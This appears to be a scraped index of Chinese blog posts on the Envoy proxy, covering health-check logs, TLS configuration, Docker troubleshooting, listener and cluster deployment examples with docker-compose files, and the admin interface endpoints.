webserver1_1 | [GIN] 2020/09/13 - 02:02:11 | 200 | 14.546µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:12 | 502 | 8.37µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:12 | 200 | 14.214µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:22 | 502 | 8.998µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:22 | 200 | 13.489µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:30 | 200 | 119.326µs | ::1 | GET \u0026quot;/ping/ok\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:32 | 200 | 8.864µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:32 | 200 | 14.679µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:38 | 200 | 14.781µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:39 | 200 | 15.452µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:39 | 200 | 14.825µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:40 | 200 | 14.784µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:40 | 200 | 14.788µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:41 | 200 | 72.985µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:42 | 200 | 8.523µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:42 | 200 | 14.497µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:42 | 200 | 15.611µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:47 | 200 | 46.065µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:47 | 200 | 19.455µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:47 | 200 | 15.079µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:48 | 200 | 22.208µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:52 | 200 | 39.693µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:52 | 200 | 32.376µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:02 | 200 | 19.476µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:02 | 200 | 11.041µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:12 | 200 | 14.292µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:12 | 200 | 8.215µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:22 | 200 | 16.145µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:22 | 200 | 11.455µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:29 | 200 | 15.02µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:30 | 200 | 34.405µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:30 | 200 | 14.647µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:30 | 200 | 15.039µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:31 | 200 | 16.706µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:31 | 200 | 15.667µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:31 | 200 | 15.025µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:32 | 200 | 15.085µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:32 | 200 | 13.446µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:03:42 | 200 | 14.702µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:03:42 | 200 | 9.262µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; 无外部流量时的请求间隔设置 官方参考\nno_traffic_interval ","permalink":"https://www.oomkill.com/2020/09/initiative-health-check/","summary":"","title":"Envoy的主动健康监测"},{"content":"方案架构 本次实例与官方Envoy front_proxy Example相似，首先会有一个Envoy单独运行。ingress的工作是给其他地方提供一个入口。来自外部的传入连接请求到这里，前端代理将会决定他们在内部的转发路径。 图源自Envoy官网文档 front_proxy\n生成证书 openssl req -nodes -new -x509 -keyout certs/server.key -out certs/server.crt -days 365 -subj \u0026quot;/C=CN/ST=Guangdong/L=Guangzhou/O=studyenvoy/OU=studyenvoy/CN=*.studyenvoy.cn\u0026quot; envoy配置说明 v3 api中envoy去掉了tls_context的配置，配置tls首先需要熟悉envoy的如下两个术语\nDownstream：下游主机连接到 Envoy，发送请求并或获得响应。 Upstream：上游主机获取来自 Envoy 的链接请求和响应。 本次使用的是ingress的代理，需要配置的即为 Downstream\nv3api中使用的是transport_socket，transport_socket为 listeners 当中某一个 filter_chains 中上线文中的配置。\ntransport_socket 官方说明为： (config.core.v3.TransportSocket) Optional custom transport socket implementation to use for downstream connections. To setup TLS, set a transport socket with name tls and DownstreamTlsContext in the typed_config. If no transport socket configuration is specified, new connections will be set up with plaintext.\n查看官网的transport_socket配置说明\n这里使用的类型为DownstreamTlsContext\ntransport_socket: # 设置tls name: envoy.transport_sockets.tls # 定义名称，不能为空 typed_config: # 实现配置的类型 \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: # 设置tls上下文 tls_certificates： certificate_chain： # 公钥设置 必须设置为，filename，inline_bytes filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: # 私钥设置 必须设置为，filename，inline_bytes filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; 准备envoy和后端服务运行环境 envoy配置文件 admin: access_log_path: /dev/null address: socket_address: { address: 0.0.0.0, port_value: 9901 } static_resources: listeners: - name: listeners_http address: socket_address: { address: 0.0.0.0, port_value: 80 } filter_chains: - filters: - name: envoy.http_connenttion_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http codec_type: AUTO route_config: name: local_route virtual_hosts: - name: local_service domains: [ \u0026quot;*\u0026quot; ] routes: - match: { prefix: \u0026quot;/\u0026quot; } redirect: path_redirect: \u0026quot;/\u0026quot; https_redirect: true http_filters: - name: envoy.router - name: listener_https address: socket_address: { address: 0.0.0.0, port_value: 443 } filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http codec_type: AUTO route_config: name: local_route virtual_hosts: - name: local_service domains: [ \u0026quot;*\u0026quot; ] routes: - match: { prefix: \u0026quot;/\u0026quot; } route: { cluster: local_service } http_filters: - name: envoy.router transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: tls_certificates: certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; clusters: - name: local_service connect_timeout: 0.25s type: STRICT_DNS lb_policy: ROUND_ROBIN load_assignment: cluster_name: local_service endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: webservice, port_value: 90 } docker-compose文件示例\nversion: '3' services: envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 ports: - 80:80 - 443:443 - 82:9901 volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml - ./certs:/etc/envoy/certs networks: envoymesh: aliases: - envoy depends_on: - webserver webserver: image: cylonchau/envoy-end:latest environment: - COLORFUL=blue networks: envoymesh: aliases: - myservice - webservice expose: - 90 networks: envoymesh: {} 容器启动正常\n证书使用者也为生成证书的信息一致\n","permalink":"https://www.oomkill.com/2020/09/envoy-v3-api-tls/","summary":"","title":"Envoy V3APi 开启 TLS"},{"content":"镜像内安装包失败处理 方法一：修改Dockerfile，在Dockerfile中增加如下\nubuntu示例\nRUN sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list RUN sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list apline示例\nRUN sed -i 's@http://dl-cdn.alpinelinux.org/@https://mirrors.aliyun.com/@g' /etc/apk/repositories 方法二：使用http代理，\nubuntu 参考 命令行使用代理\n下载镜像失败处理 方法一：docker宿主机使用ss，开启局域网可连接。同局域网中的都可直接连此代理 方法二： docker systemd的 service文件中增加http代理\n可看到已经可以成功运行envoy example示例\ncannot bind \u0026lsquo;0.0.0.0:80\u0026rsquo;: Permission denied docker-compose文件\nversion: '3' services: envoy: image: envoyproxy/envoy-alpine:v1.15-latest volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml network_mode: \u0026quot;service:mainserver\u0026quot; depends_on: - mainserver mainserver: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - webserver - httpserver - envoy_end networks: envoymesh: {} 启动时报错\nenvoy_1 | [2020-09-06 07:09:48.618][8][critical][main] [source/server/server.cc:101] error initializing configuration '/etc/envoy/envoy.yaml': cannot bind '0.0.0.0:80': Permission denied envoy_1 | [2020-09-06 07:09:48.618][8][info][main] [source/server/server.cc:704] exiting envoy_1 | cannot bind '0.0.0.0:80': Permission denied root_envoy_1 exited with code 1 参考 list\nenvironment: - \u0026quot;ENVOY_UID=0\u0026quot; ","permalink":"https://www.oomkill.com/2020/09/envoy-example-failed/","summary":"","title":"envoy官方example运行失败问题处理"},{"content":"official front proxy\n在一个Services Mash内部中，都会存在一到多个微服务，为了将南北向流量统一引入网格内部管理，通常存在单独运行的envoy实例。\nEnvoy的listener支持面向下游客户端一侧的TLS会话，并可选地支持验正客户端证书；\nlistener中用到的数字证书可于配置中静态提供，也可借助于SDS动态获取;\ntls_context 是 listeners 当中某一个 filter_chains 中上线文中的配置，tls_context 配置在哪个 listeners当中就隶属于哪个listeners。\nlisteners:\r...\rfilter_chains:\r- filters:\r..\rtls_context:\rcommon_tls_context: {} # 常规证书相关设置；\rtls_params: {} # TLS协议版本，加密套件等；\rtls_certifcates: [] # 用到的证书和私钥文件；\r- certifcate_chain: {}\rfilename: # 证书文件路径;\rprivate_key: {} # 私钥;\rfilename: # 私钥文件路径;\rpassword: {} # 私钥口令；\rfilename: # 口令文件路径；\rtls_certifcate_sds_secret_configs: [] # 要基于SDS API获取TLS会话的相关信息时的配置；\rrequire_client_certifcate: # 是否验证客户端证书；\r例如，下面示例将前面的Ingress示例中的Envoy配置为通过TLS提供服务，并将所有基于http协议的请求重定向至https；\nadmin:\raccess_log_path: /dev/null\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 9901 }\rstatic_resources:\rlisteners:\r- name: listeners_http\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy.http_connenttion_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: ingress_http\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: local_service\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rredirect:\rpath_redirect: \u0026quot;/\u0026quot;\rhttps_redirect: true\rhttp_filters:\r- name: envoy.router\r- name: listener_https\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 443 }\rfilter_chains:\r- filters:\r- name: envoy.http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: ingress_http\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: local_service\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rroute: { cluster: local_service }\rhttp_filters:\r- name: envoy.router\rtransport_socket:\rname: envoy.transport_sockets.tls\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext\rcommon_tls_context:\rtls_certificates:\rcertificate_chain:\rfilename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot;\rprivate_key:\rfilename: \u0026quot;/etc/envoy/certs/server.key\u0026quot;\rclusters:\r- name: local_service\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: local_service\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: webservice, port_value: 90 }\r将自定义配置组织于专用目录（例如ingres.htps_proxy/）下的envoy.yaml文件中，并创建Dockerfile文件构建自定义镜像；\n生成测试使用的数字证书； mkdir -p certs\ropenssl req -nodes -new -x509 -keyout certs/server.key -out certs/server.crt -days 3650 -subj '/CN=ik8s.io/O=MageEdu LTD./C=CN'\ropenssl req -nodes -new -key certs/server.key -out certs/server.crt -days 365 -subj \u0026quot;/C=CN/ST=Guangdong/L=Guangzhou/O=xdevops/OU=xdevops/CN=*.xdevops.cn\u0026quot;\rdocker-compose文件示例\nversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\r- ./certs:/etc/envoy/certs\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver\rwebserver:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=blue\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rnetworks:\renvoymesh: {}\r","permalink":"https://www.oomkill.com/2020/09/envoy-tls-configuration/","summary":"","title":"Envoy TLS 配置"},{"content":"常用的构建方法 https://skyao.io/learning-envoy/\n手动配置构建环境，手动构建Envoy。\n使用Envoy提供的预制于Docker中的构建环境进行手动构建二进制Envoy\n使用Envoy提供的预制于Docker中的构建环境进行手动构建二进制Envoy，并直接将Envoy程序打包成Docker镜像\n提供Bootstrap配置文件，存在使用xDS的动态资源时，还需要基于文件或管理服务器向其提供必须的配置信息\n也可使用Envoy的配置生成器生成示例性配置 基于Bootstrap配置文件启动Envoy实例\n直接启动二进制Envoy 于Kubernetes平台基于Sidecar的形式运行Envoy，或运行单独的Envoy Pod（Edge Proxy） 启动Envoy 启动Envoy时，需要通过（-c 选项为其指定初始配置文件以提供引导配置（Bootstrap configuration），这也是使用v2APl的必然要求；\nenvoy -c \u0026lt;path to config\u0026gt;.{json,yaml,pb,pb_text}\r扩展名代表了配置信息的组织格式；\n引导配置是Envoy配置信息的基点，用于承载Envoy的初始配置，它可能包括静态资源和动态资源的定义\n静态资源（static_resources）于启动直接加载\n动态资源（dynamic_resources）则需要通过配置的xDS服务获取并生成\n通常，Listener 和 Cluster 是Envoy得以运行的基础，而二者的配置可以全部为静态格式，也可以混合使用动态及静态方式提供，或者全部配置为动态；\n一个yaml格式纯静态的基础配置框架类似如下所示：\nstatic_resources:\rlinteners:\r- name: ...\raddress: {}\rfilter_chains: []\rclusters:\r- name: ...\rtype: ...\rconnect_timeout: {}\rlb_policy: ...\rload_assignment: {}\rListener 简易静态配置 侦听器主要用于定义Envoy监听的用于接收Down streams请求的套接字、用于处理请求时调用的过滤器链及相关的其它配置属性;目前envoy仅支持tcp的协议\nlisteners:\r- name:\raddress:\rsocket_address: { address: ..., port_value: ..., protocol: ...}\rL4过滤器echo主要用于演示网络过滤器APl的功能，它会回显接收到的所有数据至下游的请求者；在配置文件中调用时其名称为 envoy.echo ；\n下面是一个最简单的静态侦听器配置示例：\necho文档\nstatic_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address:\raddress: 0.0.0.0\rport_value: 15001\rfilter_chains:\r- filters:\r- name: envoy.echo\rCluster 静态配置 通常，集群代表了一组提供相同服务的上游服务器（端点）的组合，它可由用户静态配置，也能够通过CDS动态获取；\n集群需要在“预热”环节完成之后方能转为可用状态，这意味着集群管理器通过DNS解析或EDS服务完成端点初始化，以及健康状态检测成功之后才可用；\ncluster 官方参数\nclusters:\r- name: ... # 集群的唯一名称，且为提供alt_stat_name时会被用于统计信息中\ralt_state_name: ... # 统计信息中使用集群带名称。\r# 用于解析集群（生成集群端点）时使用的服务发现类型，可用值有 STATIC STRJCT_DNS LOGICAL_DNS GRIGINAL_DST和EDS等\rtype: .. # 负载均衡算法，支持 ROUND_ROBIN LEAST_REQUEST RING_HASH RANDOM MAGLEV CLUSTER_PROVIDED\rlb_policy: # 为 STATIC STRJCT_DNS LOGICAL_DNS 类型的集群指定成员获取方式，EDS类型继承要使用eds_cluster_config字段配置。\rloda_assignment: cluser_name: .. # 集群名称\rendpoints: #端点列表\r- locality: {} #表示上游主机所处的位置，通常以 region、none等进行标识。\rlb_endpoints: # 属于指定位置的端点列表\r- endpoint_name: #端点的名称\rendpoint: # 端点的定义\rsocket_address: #端点地址标识\raddress:\rport_value:\rportocol:\r静态Cluster的各端点可以在配置中直接给出，也可借助DNS服务进行动态发现；\n下面的示例直接给出了两个端点地址\nclusters:\r- name: test_cluster\rconnect_timeout: 0.25\rtype: STATIC\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: test_cluster\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: 10.0.0.1, port_value: 80 }\r- endpoint:\raddress:\rsocket_address: { address: 10.0.0.2, port_value: 80 }\rfilter tcp_proxy 官方文档\nTCP代理过滤器在下游客户端及上游集群之间执行1:1网络连接代理\n它可以单独用作隧道替换，也可以同其他过滤器（如MongoDB过滤器或速率限制过滤器）结合使用； TCP代理过滤器严格执行由全局资源管理于为每个上游集群的全局资源管理器设定的连接限制 TCP代理过滤器检查上游集群的资源管理器是否可以在不超过该集群的最大连接数的情况下创建连接； TCP代理过滤器可直接将请求路由至指定的集群，也能够在多个目标集群间基于权重进行调度转发； 配置示例：\nlisteners:\rname: listener_0\raddress:\rsocket_address: { address:0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy.tcp_proxy\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.config.filter.network.tcp_proxy.v2.TcpProxy\rstat_prefix: tcp_01 # 统计数据的前缀\rcluster: test_cluster\r下面的示例基于TCP代理将下游用户（本机）请求代理至外部的（egress）两个web服务器\nstatic_resources:\rlisteners:\rname: listener_0\raddress: socket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy.tcp_proxy\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.tcp_proxy.v3.TcpProxy\rstat_prefix: tcp_01\rcluster: test_tcp\rclusters:\r- name: test_tcp\rconnect_timeout: 0.5s\rtype: STATIC\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: test_tcp\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: 127.0.0.1, port_value: 90 }\rversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\rports: - 81:80\renvironment: - ENVOY_UID=0\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetwork_mode: \u0026quot;service:mainserver\u0026quot; depends_on:\r- mainserver\rmainserver:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- webserver\r- httpserver\r- envoy_end\rnetworks:\renvoymesh: {}\rhttp_connection_manager http_connection_manager 通过引入L7过滤器链实现了对http协议的操纵，其中router过滤器用于配置路由转发；\n官方文档\nlisteners:\r- name:\raddress: socket_address: { address: ..., port_value: ...., protocol:... }\rfilter_chains:\r- filters:\r- name: envoy.http_connection_manager\rconfig:\rcondec_type: .. # 链接管理器使用的编解码器类型，可用值有 AUTO HTTP1 HTTP2\rstat_prefix: ... # 统计信息中使用的易读性的信息前缀。\rroute_config: ... # 静态路由配置，动态配置应该使用rds字段进行指定。\rname: # 路由配置的名称\rvirtual_hosts: # 虚拟主机的路基名称，用于构成路由表\r- name: ... # 虚拟主机的逻辑名称，用于统计信息，与路由无关\rdomains: [] # 虚拟主机匹配的域名列表，支持 * 通配符，匹配搜索次序为精确匹配、前缀匹配、后缀匹配及完全匹配。\rroutes: [] # 路由列表，按照顺序搜索，第一个匹配到的路由信息。\rhttp_filters: # 定义http过滤器链\r- name: envoy.router # 调用过滤器为envoy.router\r处理请求时，Envoy首先根据下游客户端请求的 host 来搜索虚拟主机列表中各 virtual_host 中的domains 列表中的定义，第一个匹配到的 Domain 的定义所属的 virtual_host 即可处理请求的虚拟主机;\n而后搜索当前虚拟生机中的 routes 列表中的路由列表中各路由条目的 match 的定义，第一个匹配到的 match 后的路由机制（route.redirect或direct_response）即生效；\nroute_config.virtual_hosts.routes 配置的路由信息用于将下游的客户端请求路由至合适的上游集群中某Server上；\n其路由方式是将url匹配match字段的定义 match 字段可通过 prefix（前级）、path（路径）或 regex（正则表达式）三者之一来表示匹配模式； 与match相关的请求将由 route 、redirect 或 direct_response 三个字段其中之一完成路由； 由route定义的路由目标必须是 cluster（上游集群名称）、cluster_header（根据请求标头中的 cluster_header 的值确定目标集群）或 weighted_clusters（路由目标有多个集群，每个集群拥有一定的权重）其中之一； routes: []\r- name: ... # 路由条目的名称\rmatch:\rprefix: ... # 请求的URL的前缀\rroute: # 路由条目\rcluster: # 目标下游集群。\rEgress代理配置示例 下面是一个egree类型的Envoy配置示例，定义了两个virtual_host，不过，发往第二个virtual_host的请求将被重定向至第一个。\nstatic_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy.http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: egress_http\rcodec_type: AUTO\rroute_config:\rname: study_route\rvirtual_hosts:\r- name: web_service_1\rdomains: [ \u0026quot;*.ik8s.io\u0026quot;, \u0026quot;ik8s.io\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rroute: { cluster: web_cluster_1 }\r- name: web_service_2\rdomains: [ \u0026quot;*.k8scast.cn\u0026quot;, \u0026quot;k8scast.cn\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rredirect:\rhost_redirect: \u0026quot;www.ik8s.io\u0026quot;\rhttp_filters:\r- name: envoy.filters.http.router\rclusters:\r- name: web_cluster_1\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: web_cluster_1\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: myservice, port_value: 90 }\r- name: web_cluster_2\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: web_cluster_2\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: webserver2, port_value: 90 }\rversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 81:80\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\rwebserver1:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=red\rnetworks:\renvoymesh:\raliases:\r- webservice\r- myservice\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=blue\rnetworks:\renvoymesh:\raliases:\r- myservice\rexpose:\r- 90\rnetworks:\renvoymesh: {}\r测试结果\n$ curl -H 'Host: www.ik8s.io' 127.0.0.1:81/ping\r{\u0026quot;message\u0026quot;:\u0026quot;pong\u0026quot;}\r$ curl -H 'Host: www.ik8s.io' 127.0.0.1:81/colorful\r{\u0026quot;message\u0026quot;:\u0026quot;hello with red.\u0026quot;}$ ingress 配置示例 static_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: ingress_http\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: local_service\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rroute: { cluster: local_service }\rhttp_filters:\r- name: envoy.filters.http.router\rclusters:\r- name: local_service\rconnect_timeout: 0.25s\rtype: STATIC\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: local_service\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: 127.0.0.1, port_value: 90 }\rversion: \u0026quot;3\u0026quot;\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetwork_mode: \u0026quot;service:webserver\u0026quot;\rdepends_on:\r- webserver\rwebserver:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=red\rnetworks:\renvoymesh:\raliases:\r- webservice\r- myservice\rexpose:\r- 90\rnetworks:\renvoymesh: {}\r","permalink":"https://www.oomkill.com/2020/09/envoy-deployment/","summary":"","title":"Envoy部署"},{"content":"envoy内建了一个管理接口，它支持查询和修改操作，甚至有可能暴露私有数据（例如统计数据、集群名称和证书信息等）因此非常有必要精心编排期访问控制机制，以避免非授权访问。\nadministration interface 属于 bootstrap 配置文件中的==顶级配置字段==使用。\nadministration interface offical document\nadmin:\raccess_log_path: .. # 管理接口的访问日志文件路径，无须记录访问日志使用/dev/null\rprofile_path: ... # cpu_profile的输出路径，默认为/var/log/envoy/envoy.prof;\raddress:\rsocket_address: # 监听的套接字\rprotocol: ..\raddress: ...\rprot_value: ...\r下面是一个简单的配置示例\nadmin:\raccess_log_path: /tmp/admin_access.log\raddress:\rsocket_address: { address: 127.0.0.1, port_value: 9901 }\radmin接口内置了多个 /path ，不同的path可能会分别接受不同的GET或POST请求\nGET /help ：打印所有可用选项； / : Admin home page /certs : GET 列出在的所有TLS相关的信息； /clusters : upstream cluster status GET，格外支持使用 /clusters?format=json ； /config_dump : dump current Envoy configs (experimental) GET，打印Envoy 加载的各类配置信息； /contention : dump current Envoy mutex contention stats (if enabled) GET 互斥跟踪； /cpuprofiler : enable/disable the CPU profiler POST 启用/禁用cupprofiler。 /drain_listeners : drain listeners /healthcheck/fail : cause the server to fail health checks POST 强制设定HTTP健康状态检查为失败； /healthcheck/ok : cause the server to pass health checks POST 强制设定HTTP健康状态检查为成功； /heapprofiler : enable/disable the heap profiler POST 启用或禁用heapprofiler； /help : print out list of admin commands /hot_restart_version : print the hot restart compatibility version GET 热重启相关信息； /listeners : print listener info GET 列出所有侦听器，支持使用 GET /listeners?format=json /logging : query/change logging levels POST，弃用或禁用不同子组件上的不同日志记录级别； /memory : print current allocation/heap usage POST，打印当前内在分配信息，以字节为单位；； /quitquitquit : exit the server POST，干净退出服务器； /ready : print server state, return 200 if LIVE, otherwise return 503 /reopen_logs : reopen access logs /reset_counters : reset all counters to zero POST，重置所有计数器； /runtime : print runtime values GET，以json格式输出所有运行时相关值； /runtime_modify : modify runtime values POST /runtime_modify?k1=v1\u0026amp;k2=v2 添加或修改在查询参数中传递的运行时值； /server_info : print server version/status information GET，打印当前Envoy Server相关信息； /stats : print server stats 按需输出统计数据，如：GET /stats?filter=reger，另外还支持json和promotheus两种格式输出； /stats/prometheus : print server stats in prometheus format /stats/recentlookups : Show recent stat-name lookups /stats/recentlookups/clear : clear list of stat-name lookups and counter /stats/recentlookups/enable : enable recording of reset stat-name lookup names 集群统计信息中主机状态的说明\nName Type Description cx_total Counter Total connecions cx_active Gauge Total active coinnections cx_connect_fail Counter Total connection failures 